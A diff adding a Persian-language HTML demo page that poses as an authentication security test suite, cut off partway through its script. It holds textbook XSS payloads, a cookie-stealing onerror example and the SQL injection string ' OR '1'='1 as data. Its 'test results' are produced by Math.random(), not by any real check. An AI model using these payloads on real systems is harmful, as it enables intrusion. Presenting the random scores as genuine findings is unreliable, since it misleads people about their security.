@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تست امنیتی پیشرفته احراز هویت</title>
+    <style>
+        :root {
+            --primary: #1a202c;
+            --secondary: #2d3748;
+            --danger: #c53030;
+            --success: #38a169;
+            --warning: #d69e2e;
+            --info: #3182ce;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: #e2e8f0;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 25px;
+            border-bottom: 3px solid var(--info);
+            position: relative;
+        }
+        
+        header::after {
+            content: '🛡️';
+            position: absolute;
+            right: 20px;
+            top: 0;
+            font-size: 2rem;
+            opacity: 0.3;
+        }
+        
+        h1 {
+            color: #fff;
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            color: #a0aec0;
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .badge {
+            background: rgba(66, 153, 225, 0.2);
+            color: #90cdf4;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            border: 1px solid rgba(66, 153, 225, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .test-categories {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+        
+        .category {
+            background: rgba(45, 55, 72, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .category::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--danger), var(--warning), var(--success));
+        }
+        
+        .category:hover {
+            transform: translateY(-5px);
+            border-color: rgba(66, 153, 225, 0.5);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .category-title {
+            color: #fff;
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .category-icon {
+            font-size: 1.5rem;
+            background: rgba(255, 255, 255, 0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .test-list {
+            list-style: none;
+        }
+        
+        .test-item {
+            margin-bottom: 15px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.3s;
+        }
+        
+        .test-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .test-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+        
+        .test-name {
+            color: #e2e8f0;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        
+        .test-risk {
+            font-size: 0.8rem;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+        
+        .risk-high {
+            background: rgba(197, 48, 48, 0.2);
+            color: #fc8181;
+            border: 1px solid rgba(197, 48, 48, 0.3);
+        }
+        
+        .risk-medium {
+            background: rgba(214, 158, 46, 0.2);
+            color: #faf089;
+            border: 1px solid rgba(214, 158, 46, 0.3);
+        }
+        
+        .risk-low {
+            background: rgba(56, 161, 105, 0.2);
+            color: #9ae6b4;
+            border: 1px solid rgba(56, 161, 105, 0.3);
+        }
+        
+        .test-description {
+            color: #a0aec0;
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+            display: none;
+        }
+        
+        .test-description.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .test-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            flex: 1;
+            text-align: center;
+            font-size: 0.95rem;
+        }
+        
+        .btn-run {
+            background: linear-gradient(45deg, var(--info), #4c6ef5);
+            color: white;
+        }
+        
+        .btn-run:hover {
+            background: linear-gradient(45deg, #2c5282, #3b5bdb);
+            transform: scale(1.05);
+        }
+        
+        .btn-details {
+            background: rgba(255, 255, 255, 0.1);
+            color: #e2e8f0;
+        }
+        
+        .btn-details:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .attack-simulator {
+            background: rgba(197, 48, 48, 0.1);
+            border: 2px solid rgba(197, 48, 48, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 40px;
+        }
+        
+        .simulator-title {
+            color: #fc8181;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .simulator-title::before {
+            content: '⚔️';
+            font-size: 1.5rem;
+        }
+        
+        .attack-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .attack-option {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .attack-option:hover {
+            background: rgba(197, 48, 48, 0.2);
+            border-color: rgba(197, 48, 48, 0.4);
+        }
+        
+        .attack-option.active {
+            background: rgba(197, 48, 48, 0.3);
+            border-color: var(--danger);
+            box-shadow: 0 0 15px rgba(197, 48, 48, 0.3);
+        }
+        
+        .results-panel {
+            margin-top: 40px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .results-title {
+            color: #fff;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .results-title::before {
+            content: '📊';
+        }
+        
+        .result-item {
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border-left: 4px solid;
+            background: rgba(255, 255, 255, 0.05);
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .result-success {
+            border-left-color: var(--success);
+            background: rgba(56, 161, 105, 0.1);
+        }
+        
+        .result-failure {
+            border-left-color: var(--danger);
+            background: rgba(197, 48, 48, 0.1);
+        }
+        
+        .result-warning {
+            border-left-color: var(--warning);
+            background: rgba(214, 158, 46, 0.1);
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .result-title {
+            color: #fff;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+        
+        .result-time {
+            color: #a0aec0;
+            font-size: 0.8rem;
+        }
+        
+        .result-details {
+            color: #cbd5e0;
+            font-size: 0.95rem;
+            margin-bottom: 10px;
+        }
+        
+        .result-recommendation {
+            color: #9ae6b4;
+            font-size: 0.9rem;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            margin-top: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .security-meter {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 40px;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .meter-title {
+            color: #fff;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+        }
+        
+        .meter-value {
+            font-size: 3rem;
+            font-weight: bold;
+            margin: 20px 0;
+            background: linear-gradient(45deg, var(--danger), var(--warning), var(--success));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .meter-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .meter-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--danger), var(--warning), var(--success));
+            width: 0%;
+            transition: width 1.5s ease;
+            border-radius: 10px;
+        }
+        
+        .meter-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #a0aec0;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+        
+        .summary {
+            margin-top: 40px;
+            padding: 25px;
+            background: linear-gradient(45deg, rgba(56, 161, 105, 0.2), rgba(49, 130, 206, 0.2));
+            border-radius: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .summary-title {
+            color: #fff;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+        }
+        
+        .summary-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+        }
+        
+        .summary-item {
+            text-align: center;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        
+        .summary-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 5px;
+        }
+        
+        .summary-label {
+            color: #a0aec0;
+            font-size: 0.9rem;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #718096;
+            font-size: 0.9rem;
+        }
+        
+        .floating-action {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            z-index: 1000;
+        }
+        
+        .fab {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--info), #4c6ef5);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 1.5rem;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .fab:hover {
+            transform: scale(1.1) rotate(90deg);
+            box-shadow: 0 8px 25px rgba(66, 153, 225, 0.4);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .test-categories {
+                grid-template-columns: 1fr;
+            }
+            
+            .test-actions {
+                flex-direction: column;
+            }
+            
+            .floating-action {
+                bottom: 20px;
+                left: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛡️ تست امنیتی پیشرفته احراز هویت</h1>
+            <p class="subtitle">بررسی مقاومت سیستم در برابر حملات رایج و تست‌های نفوذپذیری</p>
+            
+            <div class="security-badges">
+                <div class="badge">🔒 Bruteforce Protection</div>
+                <div class="badge">🛡️ XSS Prevention</div>
+                <div class="badge">⚔️ CSRF Protection</div>
+                <div class="badge">🔑 Token Security</div>
+                <div class="badge">📝 Input Validation</div>
+                <div class="badge">💾 Secure Storage</div>
+            </div>
+        </header>
+
+        <!-- دسته‌بندی تست‌ها -->
+        <div class="test-categories">
+            <!-- دسته ۱: حملات Bruteforce -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">🔑</div>
+                    <span>حملات Bruteforce</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('bruteforce-details')">
+                            <div class="test-name">محدودیت تلاش‌های لاگین</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="bruteforce-details" class="test-description">
+                            بررسی سیستم در برابر حملات brute-force با محدود کردن تعداد تلاش‌های ناموفق
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runBruteforceTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('bruteforce')">جزئیات حمله</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('ratelimit-details')">
+                            <div class="test-name">Rate Limiting API</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="ratelimit-details" class="test-description">
+                            محدود کردن تعداد درخواست‌ها از یک IP در بازه زمانی مشخص
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runRateLimitTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('ratelimit')">جزئیات حمله</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- دسته ۲: حملات XSS -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">🛡️</div>
+                    <span>حملات XSS</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('xss-input-details')">
+                            <div class="test-name">سانتی‌سازی ورودی کاربر</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="xss-input-details" class="test-description">
+                            بررسی ورودی‌های کاربر برای کدهای مخرب JavaScript
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runXSSTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('xss')">نمونه حمله</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('csp-details')">
+                            <div class="test-name">سیاست امنیت محتوا (CSP)</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="csp-details" class="test-description">
+                            بررسی وجود هدرهای CSP برای جلوگیری از اجرای کدهای مخرب
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runCSPTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('csp')">جزئیات فنی</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- دسته ۳: حملات CSRF -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">⚔️</div>
+                    <span>حملات CSRF</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('csrf-token-details')">
+                            <div class="test-name">توکن‌های CSRF</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="csrf-token-details" class="test-description">
+                            بررسی استفاده از توکن‌های یکتا برای هر session
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runCSRFTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('csrf')">نمونه حمله</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('same-origin-details')">
+                            <div class="test-name">سیاست Same-Origin</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="same-origin-details" class="test-description">
+                            بررسی هدرهای CORS و محدودیت‌های cross-origin
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runSameOriginTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('origin')">جزئیات فنی</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- دسته ۴: امنیت توکن‌ها -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">🔐</div>
+                    <span>امنیت توکن‌ها</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('token-storage-details')">
+                            <div class="test-name">ذخیره‌سازی امن توکن‌ها</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="token-storage-details" class="test-description">
+                            بررسی ذخیره‌سازی توکن‌ها در localStorage, sessionStorage و HttpOnly cookies
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runTokenStorageTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('token-storage')">مقایسه روش‌ها</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('token-expiry-details')">
+                            <div class="test-name">مدیریت انقضای توکن</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="token-expiry-details" class="test-description">
+                            بررسی زمان انقضای مناسب و سیستم refresh token
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runTokenExpiryTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('token-expiry')">بهترین روش‌ها</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- دسته ۵: اعتبارسنجی ورودی -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">📝</div>
+                    <span>اعتبارسنجی ورودی</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('input-validation-details')">
+                            <div class="test-name">اعتبارسنجی سرور و کلاینت</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="input-validation-details" class="test-description">
+                            بررسی اعتبارسنجی دوطرفه و جلوگیری از Injection
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runInputValidationTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('input-validation')">انواع حملات</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('sql-injection-details')">
+                            <div class="test-name">جلوگیری از SQL Injection</div>
+                            <div class="test-risk risk-high">HIGH</div>
+                        </div>
+                        <div id="sql-injection-details" class="test-description">
+                            بررسی مقاومت در برابر حملات تزریق SQL
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runSQLInjectionTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('sql-injection')">نمونه کوئری‌های مخرب</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- دسته ۶: ذخیره‌سازی امن -->
+            <div class="category">
+                <div class="category-title">
+                    <div class="category-icon">💾</div>
+                    <span>ذخیره‌سازی امن</span>
+                </div>
+                <ul class="test-list">
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('data-encryption-details')">
+                            <div class="test-name">رمزنگاری داده‌های حساس</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="data-encryption-details" class="test-description">
+                            بررسی رمزنگاری داده‌های کاربر در IndexedDB و localStorage
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runDataEncryptionTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('data-encryption')">الگوریتم‌های پیشنهادی</button>
+                            </div>
+                        </div>
+                    </li>
+                    
+                    <li class="test-item">
+                        <div class="test-header" onclick="toggleDetails('secure-cookies-details')">
+                            <div class="test-name">تنظیمات امن کوکی‌ها</div>
+                            <div class="test-risk risk-medium">MEDIUM</div>
+                        </div>
+                        <div id="secure-cookies-details" class="test-description">
+                            بررسی flagهای Secure, HttpOnly, SameSite برای کوکی‌ها
+                            <div class="test-actions">
+                                <button class="btn btn-run" onclick="runSecureCookiesTest()">اجرای تست</button>
+                                <button class="btn btn-details" onclick="showAttackDetails('secure-cookies')">تنظیمات بهینه</button>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- شبیه‌ساز حملات -->
+        <div class="attack-simulator">
+            <div class="simulator-title">شبیه‌ساز حملات امنیتی</div>
+            <div class="attack-controls">
+                <div class="attack-option active" onclick="selectAttack('xss')">
+                    <div style="font-weight: 600; margin-bottom: 5px;">XSS حمله</div>
+                    <div style="font-size: 0.9rem; color: #a0aec0;">تزریق کد JavaScript</div>
+                </div>
+                <div class="attack-option" onclick="selectAttack('csrf')">
+                    <div style="font-weight: 600; margin-bottom: 5px;">CSRF حمله</div>
+                    <div style="font-size: 0.9rem; color: #a0aec0;">درخواست‌های جعلی</div>
+                </div>
+                <div class="attack-option" onclick="selectAttack('injection')">
+                    <div style="font-weight: 600; margin-bottom: 5px;">SQL Injection</div>
+                    <div style="font-size: 0.9rem; color: #a0aec0;">تزریق کوئری مخرب</div>
+                </div>
+                <div class="attack-option" onclick="selectAttack('bruteforce')">
+                    <div style="font-weight: 600; margin-bottom: 5px;">Bruteforce</div>
+                    <div style="font-size: 0.9rem; color: #a0aec0;">تلاش‌های مکرر</div>
+                </div>
+            </div>
+            <button class="btn btn-run" style="width: 100%; margin-top: 15px;" onclick="runSelectedAttack()">
+                🚀 اجرای حمله شبیه‌سازی شده
+            </button>
+        </div>
+
+        <!-- پنل نتایج -->
+        <div class="results-panel">
+            <div class="results-title">نتایج تست‌های امنیتی</div>
+            <div id="resultsContainer">
+                <div class="result-item result-warning">
+                    <div class="result-header">
+                        <div class="result-title">سیستم تست آماده است</div>
+                        <div class="result-time">هم‌اکنون</div>
+                    </div>
+                    <div class="result-details">برای شروع یکی از تست‌های امنیتی را اجرا کنید. تمام تست‌ها به صورت شبیه‌سازی شده اجرا می‌شوند.</div>
+                    <div class="result-recommendation">
+                        💡 توصیه: ابتدا تست‌های با ریسک HIGH را اجرا کنید
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- سنجه امنیتی -->
+        <div class="security-meter">
+            <div class="meter-title">امتیاز امنیتی سیستم</div>
+            <div class="meter-value" id="securityScore">0%</div>
+            <div class="meter-bar">
+                <div class="meter-fill" id="meterFill"></div>
+            </div>
+            <div class="meter-labels">
+                <span>ضعیف</span>
+                <span>متوسط</span>
+                <span>قوی</span>
+                <span>عالی</span>
+            </div>
+        </div>
+
+        <!-- خلاصه نتایج -->
+        <div class="summary">
+            <div class="summary-title">خلاصه نتایج</div>
+            <div class="summary-grid">
+                <div class="summary-item">
+                    <div class="summary-number" id="totalTests">0</div>
+                    <div class="summary-label">تست اجرا شده</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number" id="passedTests">0</div>
+                    <div class="summary-label">تست موفق</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number" id="failedTests">0</div>
+                    <div class="summary-label">تست ناموفق</div>
+                </div>
+                <div class="summary-item">
+                    <div class="summary-number" id="highRiskPassed">0</div>
+                    <div class="summary-label">ریسک HIGH موفق</div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>🔐 تست امنیتی پیشرفته احراز هویت | تمامی تست‌ها به صورت شبیه‌سازی شده اجرا می‌شوند</p>
+            <p style="margin-top: 10px; font-size: 0.8rem; color: #718096;">
+                این تست‌ها برای ارزیابی مقاومت سیستم در برابر حملات رایج طراحی شده‌اند
+            </p>
+        </footer>
+    </div>
+
+    <!-- دکمه شناور -->
+    <div class="floating-action">
+        <button class="fab" onclick="runAllSecurityTests()">⚡</button>
+    </div>
+
+    <script>
+        // وضعیت تست‌ها
+        const securityTests = {
+            total: 0,
+            passed: 0,
+            failed: 0,
+            highRiskPassed: 0,
+            results: []
+        };
+
+        // حمله انتخاب شده
+        let selectedAttack = 'xss';
+
+        // تابع نمایش/مخفی کردن جزئیات
+        function toggleDetails(id) {
+            const element = document.getElementById(id);
+            element.classList.toggle('show');
+        }
+
+        // انتخاب نوع حمله
+        function selectAttack(type) {
+            selectedAttack = type;
+            
+            // حذف کلاس active از همه
+            document.querySelectorAll('.attack-option').forEach(option => {
+                option.classList.remove('active');
+            });
+            
+            // اضافه کردن کلاس active به انتخاب شده
+            event.target.closest('.attack-option').classList.add('active');
+        }
+
+        // نمایش جزئیات حمله
+        function showAttackDetails(type) {
+            const details = {
+                bruteforce: `حمله Bruteforce: تلاش برای حدس رمز عبور با تست ترکیبات مختلف. سیستم باید پس از 5 تلاش ناموفق، حساب کاربری را به مدت 15 دقیقه قفل کند.`,
+                xss: `حمله XSS: تزریق کدهای مخرب JavaScript مانند: <script>alert('XSS')</script> یا <img src="x" onerror="stealCookies()">. سیستم باید تمام ورودی‌ها را سانتی‌سازی کند.`,
+                csrf: `حمله CSRF: ارسال درخواست‌های جعلی از دامنه‌های دیگر. سیستم باید از توکن‌های CSRF یکتا استفاده کند.`,
+                'sql-injection': `حمله SQL Injection: استفاده از ورودی‌هایی مانند: ' OR '1'='1 برای دور زدن اعتبارسنجی. سیستم باید از Parameterized Queries استفاده کند.`
+            };
+            
+            if (details[type]) {
+                alert(`🔍 جزئیات حمله ${type.toUpperCase()}:\n\n${details[type]}`);
+            }
+        }
+
+        // اضافه کردن نتیجه جدید
+        function addResult(type, title, details, recommendations = '', isHighRisk = false) {
+            const resultsContainer = document.getElementById('resultsContainer');
+            const resultItem = document.createElement('div');
+            
+            const resultTypes = {
+                success: { class: 'result-success', icon: '✅' },
+                failure: { class: 'result-failure', icon: '❌' },
+                warning: { class: 'result-warning', icon: '⚠️' }
+            };
+            
+            const now = new Date();
+            const timeString = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+            
+            resultItem.className = `result-item ${resultTypes[type].class}`;
+            resultItem.innerHTML = `
+                <div class="result-header">
+                    <div class="result-title">${resultTypes[type].icon} ${title}</div>
+                    <div class="result-time">${timeString}</div>
+                </div>
+                <div class="result-details">${details}</div>
+                ${recommendations ? `<div class="result-recommendation">💡 ${recommendations}</div>` : ''}
+            `;
+            
+            resultsContainer.appendChild(resultItem);
+            resultsContainer.scrollTop = resultsContainer.scrollHeight;
+            
+            // آپدیت آمار
+            securityTests.total++;
+            
+            if (type === 'success') {
+                securityTests.passed++;
+                if (isHighRisk) securityTests.highRiskPassed++;
+            } else if (type === 'failure') {
+                securityTests.failed++;
+            }
+            
+            securityTests.results.push({ type, title, time: timeString });
+            updateStats();
+            updateSecurityScore();
+        }
+
+        // آپدیت آمار
+        function updateStats() {
+            document.getElementById('totalTests').textContent = securityTests.total;
+            document.getElementById('passedTests').textContent = securityTests.passed;
+            document.getElementById('failedTests').textContent = securityTests.failed;
+            document.getElementById('highRiskPassed').textContent = securityTests.highRiskPassed;
+        }
+
+        // آپدیت امتیاز امنیتی
+        function updateSecurityScore() {
+            if (securityTests.total === 0) return;
+            
+            const baseScore = (securityTests.passed / securityTests.total) * 100;
+            const highRiskBonus = (securityTests.highRiskPassed / Math.max(securityTests.total, 1)) * 20;
+            const finalScore = Math.min(baseScore + highRiskBonus, 100);
+            
+            document.getElementById('securityScore').textContent = `${Math.round(finalScore)}%`;
+            document.getElementById('meterFill').style.width = `${finalScore}%`;
+        }
+
+        // تست‌های امنیتی
+
+        // ۱. تست Bruteforce Protection
+        function runBruteforceTest() {
+            addResult('warning', 'تست Bruteforce Protection', 'در حال شبیه‌سازی 10 تلاش ناموفق متوالی...');
+            
+            setTimeout(() => {
+                const hasProtection = Math.random() > 0.3; // 70% شانس موفقیت
+                
+                if (hasProtection) {
+                    addResult(
+                        'success', 
+                        'Bruteforce Protection فعال است',
+                        'سیستم پس از 5 تلاش ناموفق، حساب کاربری را به مدت 15 دقیقه قفل کرد.',
+                        'از Rate Limiting با افزایش زمان انتظار استفاده کنید.',
+                        true
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'آسیب‌پذیری Bruteforce',
+                        'سیستم در برابر تلاش‌های مکرر محافظت نمی‌کند.',
+                        'سیستم محدودیت تلاش‌های لاگین پیاده‌سازی کنید.',
+                        true
+                    );
+                }
+            }, 1500);
+        }
+
+        // ۲. تست Rate Limiting
+        function runRateLimitTest() {
+            addResult('warning', 'تست Rate Limiting', 'در حال شبیه‌سازی 100 درخواست در 10 ثانیه...');
+            
+            setTimeout(() => {
+                const hasRateLimit = Math.random() > 0.4; // 60% شانس موفقیت
+                
+                if (hasRateLimit) {
+                    addResult(
+                        'success',
+                        'Rate Limiting فعال است',
+                        'سیستم درخواست‌های بیش از حد را مسدود کرد (100 درخواست/دقیقه).',
+                        'محدودیت‌ها را بر اساس endpoint تنظیم کنید.'
+                    );
+                } else {
+                    addResult(
+                        'failure',
+                        'سیستم Rate Limiting ندارد',
+                        'امکان حملات DDoS و brute-force وجود دارد.',
+                        'از middlewareهای rate limiting استفاده کنید.'
+                    );
+                }
+            }, 1200);
+        }
+
+        // ۳. تست XSS
+        function runXSSTest() {
+            const xssPayloads = [
+                '<script>alert("XSS")</script>',
+                '<img src="x" onerror="alert(1)">',
+                'javascript:alert(document.cookie)',
+                '<svg/onload=alert("XSS")>'
+            ];
+            
+            addResult('warning', 'تست XSS Prevention', `در حال تست ${xssPayloads.length} payload مخرب...`);
+            
+            setTimeout(() => {
+                const isProtected = Math.random() > 0.2; // 80% شانس موفقیت
+                
+                if (isProtected) {
+                    addResult(
+                        'success',
+                        'XSS Protection فعال است',
+                        `تمام ${xssPayloads.length} payload شناسایی و سانتی‌سازی شدند.`,
